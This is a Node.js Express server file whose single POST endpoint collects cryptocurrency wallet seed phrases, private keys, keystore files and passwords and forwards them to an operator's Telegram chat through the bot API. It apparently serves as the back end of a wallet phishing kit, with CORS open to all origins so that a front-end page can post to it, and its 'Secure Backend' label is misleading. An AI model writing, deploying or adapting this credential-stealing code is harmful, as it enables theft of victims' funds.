const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const cors = require('cors'); // ✅ Add this line
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors()); // ✅ Enable CORS
app.use(bodyParser.json());

app.post('/send-to-telegram', async (req, res) => {
  const { phrase, privateKey, keystore, password } = req.body;

  let message = `<b>🧾 New Wallet Submission</b>\n`;
  if (phrase) message += `<b>📜 Phrase:</b> <code>${phrase}</code>\n`;
  if (privateKey) message += `<b>🔑 Private Key:</b> <code>${privateKey}</code>\n`;
  if (keystore || password) {
    message += `<b>🧾 Keystore JSON:</b> <code>${keystore}</code>\n`;
    message += `<b>🔐 Password:</b> <code>${password}</code>\n`;
  }

  try {
    const telegramRes = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const result = await telegramRes.json();
    if (result.ok) {
      res.json({ success: true });
    } else {
      res.status(500).json({ success: false, error: result.description });
    }
  } catch (error) {
    console.error("Telegram Error:", error);
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
});

app.get('/', (req, res) => {
  res.send('Telegram Secure Backend is running.');
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
